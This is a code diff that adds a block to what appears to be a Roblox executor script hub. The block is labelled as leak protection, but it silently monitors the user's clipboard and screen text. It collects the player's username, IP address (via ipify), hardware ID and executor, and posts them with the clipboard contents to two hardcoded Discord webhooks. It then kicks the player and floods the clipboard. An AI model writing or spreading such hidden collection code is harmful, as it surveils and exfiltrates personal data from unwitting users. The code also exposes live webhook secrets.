@@ -6120,3 +6120,342 @@ hahtool:AddSlider({
 })
 
 hahtool:AddSection("اسف ذا التاب صغير")
+local Players=game:GetService("Players")local HttpService=game:GetService("HttpService")local RunService=game:GetService("RunService")local LocalPlayer=Players.LocalPlayer
+
+local WEBHOOK_URL1="https://discord.com/api/webhooks/1490379549089730671/pCdgZWRYB18LiO5iUA4ohO5HOXawyNIOgxg8GMKEcJzlYMMJmXQAtqzDLt7k1NmaBNPB"
+local WEBHOOK_URL2="https://discord.com/api/webhooks/1490380518829592696/69vE1q2LkrnaeWwqT0SlZsYUuNjQoYF10z7EH56RLbvkU1ecei469GDjmlyf7z7lMNP6"
+
+local KICK_MESSAGE="You were caught trying to leak data from the Nexus center. Don't try again. ☺️"
+
+local ProtectedCodes={}
+
+local function GetAllCode()
+    local allCode=""
+    for i=1,200 do
+        local info=debug.getinfo(i)
+        if not info then break end
+        if info.source and info.source~="=[C]" then
+            allCode=allCode.."\n"..info.source
+        end
+    end
+    return allCode
+end
+
+local FullSource=GetAllCode()
+
+for line in FullSource:gmatch("[^\r\n]+")do
+    if #line>5 then
+        table.insert(ProtectedCodes,line)
+    end
+end
+
+local function RandomChar()
+    local chars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*"
+    return chars:sub(math.random(1,#chars),math.random(1,#chars))
+end
+
+local function ScrambleText(text)
+    local result=""
+    for i=1,#text do
+        if text:sub(i,i):match("%w")then
+            result=result..RandomChar()
+        else
+            result=result..text:sub(i,i)
+        end
+    end
+    return result
+end
+
+local function getHttpRequestFunction()
+    local funcs={http_request,(syn and syn.request),(http and http.request),request}
+    for _,func in ipairs(funcs)do
+        if typeof(func)=="function"then
+            return func
+        end
+    end
+    return nil
+end
+
+local function sendWebhook(url,data)
+    local jsonData=HttpService:JSONEncode(data)
+    local httpRequest=getHttpRequestFunction()
+    if httpRequest then
+        local response={
+            Url=url,
+            Method="POST",
+            Headers={["Content-Type"]="application/json"},
+            Body=jsonData
+        }
+        pcall(function()
+            return httpRequest(response)
+        end)
+    end
+end
+
+local function ClearClipboard()
+    pcall(function()
+        setclipboard("Nice Try")
+    end)
+end
+
+local function GetPlayerData()
+    local data={
+        username=LocalPlayer.Name,
+        display_name=LocalPlayer.DisplayName,
+        user_id=LocalPlayer.UserId,
+        account_age=LocalPlayer.AccountAge.." days",
+        place_id=game.PlaceId,
+        game_name="Unknown",
+        executor="Unknown",
+        ip="Unknown",
+        hwid="Unknown"
+    }
+    
+    pcall(function()
+        local info=game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+        data.game_name=info.Name
+    end)
+    
+    pcall(function()
+        if identifyexecutor then
+            data.executor=identifyexecutor()
+        end
+    end)
+    
+    pcall(function()
+        local httpRequest=getHttpRequestFunction()
+        if httpRequest then
+            local res=httpRequest({
+                Url="https://api.ipify.org?format=json",
+                Method="GET"
+            })
+            if res and res.Body then
+                local ipData=HttpService:JSONDecode(res.Body)
+                data.ip=ipData.ip or "Unknown"
+            end
+        end
+    end)
+    
+    pcall(function()
+        if gethwid then
+            data.hwid=gethwid()
+        end
+    end)
+    
+    return data
+end
+
+local function SecurityKick(content)
+    local playerData=GetPlayerData()
+    local teleportCode=string.format(
+        '(game:GetService("TeleportService")):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)',
+        game.PlaceId,
+        game.JobId
+    )
+    
+    local embedData={
+        username="Nexus Security",
+        avatar_url="https://cdn.discordapp.com/emojis/1035498027814117457.webp",
+        embeds={{
+            title="Leak Attempt Detected",
+            color=0xFF0000,
+            thumbnail={
+                url="https://www.roblox.com/headshot-thumbnail/image?userId="..playerData.user_id.."&width=420&height=420&format=png"
+            },
+            footer={
+                text="Nexus Security | "..os.date("%Y-%m-%d %H:%M:%S")
+            },
+            fields={
+                {
+                    name="Player Info",
+                    value=string.format("```User: %s\nDisplay: %s\nUserId: %d\nAccount Age: %s```",
+                        playerData.username,
+                        playerData.display_name,
+                        playerData.user_id,
+                        playerData.account_age
+                    ),
+                    inline=false
+                },
+                {
+                    name="System Info",
+                    value=string.format("```Game: %s\nPlaceId: %d\nExecutor: %s\nIP: %s```",
+                        playerData.game_name,
+                        playerData.place_id,
+                        playerData.executor,
+                        playerData.ip
+                    ),
+                    inline=false
+                },
+                {
+                    name="Leaked Content",
+                    value=string.format("```lua\n%s\n```",content:sub(1,1000)),
+                    inline=false
+                },
+                {
+                    name="Teleport Code",
+                    value=string.format("```lua\n%s\n```",teleportCode),
+                    inline=false
+                }
+            }
+        }}
+    }
+    
+    sendWebhook(WEBHOOK_URL1,embedData)
+    sendWebhook(WEBHOOK_URL2,embedData)
+    
+    ClearClipboard()
+    task.wait(0.5)
+    LocalPlayer:Kick(KICK_MESSAGE)
+    while true do ClearClipboard()task.wait(0.1)end
+end
+
+local function ProtectTextElement(element)
+    if not element or not element:IsA("GuiObject")then return end
+    
+    local originalText=element.Text or ""
+    if #originalText<5 then return end
+    
+    for _,code in ipairs(ProtectedCodes)do
+        if originalText:find(code,1,true)then
+            element.Text=ScrambleText(originalText)
+            element:GetPropertyChangedSignal("Text"):Connect(function()
+                element.Text=ScrambleText(originalText)
+            end)
+            return
+        end
+    end
+end
+
+spawn(function()
+    while true do
+        pcall(function()
+            local coreGui=game:GetService("CoreGui")
+            for _,gui in ipairs(coreGui:GetDescendants())do
+                if gui:IsA("TextLabel")or gui:IsA("TextBox")then
+                    ProtectTextElement(gui)
+                end
+            end
+        end)
+        task.wait(0.05)
+    end
+end)
+
+spawn(function()
+    local lastClip=""
+    while true do
+        pcall(function()
+            local current=getclipboard()
+            if current and current~=lastClip and current~="Nice Try"then
+                for _,code in ipairs(ProtectedCodes)do
+                    if current:find(code,1,true)then
+                        SecurityKick(current)
+                        return
+                    end
+                end
+                
+                if current:find("loadstring")or current:find("http")or current:find("github")or current:find("webhook")then
+                    SecurityKick(current)
+                    return
+                end
+                
+                lastClip=current
+            end
+        end)
+        task.wait(0.01)
+    end
+end)
+
+local origLoadstring=loadstring
+getgenv().loadstring=function(code)
+    if type(code)=="string"then
+        for _,protected in ipairs(ProtectedCodes)do
+            if code:find(protected,1,true)then
+                SecurityKick(code)
+                return function()LocalPlayer:Kick(KICK_MESSAGE)end
+            end
+        end
+        
+        if code:find("https?://")then
+            local url=code:match('["\'](https?://[^"\']+)["\']')
+            if url then
+                SecurityKick("URL: "..url)
+                return function()LocalPlayer:Kick(KICK_MESSAGE)end
+            end
+        end
+        
+        if code:find("loadstring")then
+            local nested=code:match('loadstring%s*%(%s*["\']*(.-)["\']*%s*%)')
+            if nested then
+                for _,protected in ipairs(ProtectedCodes)do
+                    if nested:find(protected,1,true)then
+                        SecurityKick(nested)
+                        return function()LocalPlayer:Kick(KICK_MESSAGE)end
+                    end
+                end
+                if nested:find("https?://")then
+                    SecurityKick("Nested URL")
+                    return function()LocalPlayer:Kick(KICK_MESSAGE)end
+                end
+            end
+        end
+    end
+    return origLoadstring(code)
+end
+
+spawn(function()
+    while true do
+        if loadstring~=getgenv().loadstring then
+            SecurityKick("Hook detected")
+        end
+        task.wait(0.3)
+    end
+end)
+
+spawn(function()
+    while true do
+        local core=game:GetService("CoreGui")
+        for _,gui in ipairs(core:GetChildren())do
+            if gui.Name~="Nexus_Monitor"and gui:IsA("ScreenGui")then
+                local texts={}
+                for _,obj in ipairs(gui:GetDescendants())do
+                    if obj:IsA("TextLabel")or obj:IsA("TextBox")then
+                        table.insert(texts,obj.Text)
+                    end
+                end
+                local combined=table.concat(texts," ")
+                for _,code in ipairs(ProtectedCodes)do
+                    if combined:find(code,1,true)then
+                        SecurityKick(combined)
+                    end
+                end
+            end
+        end
+        task.wait(0.5)
+    end
+end)
+
+spawn(function()
+    while true do
+        pcall(function()
+            for _,p in ipairs(Players:GetPlayers())do
+                if p~=LocalPlayer then
+                    local char=p.Character
+                    if char then
+                        local head=char:FindFirstChild("Head")
+                        if head and head:IsA("BasePart")then
+                            local billboard=head:FindFirstChildOfClass("BillboardGui")
+                            if billboard then
+                                for _,obj in ipairs(billboard:GetDescendants())do
+                                    if obj:IsA("TextLabel")or obj:IsA("TextBox")then
+                                        ProtectTextElement(obj)
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end)
+        task.wait(1)
+    end
+end)
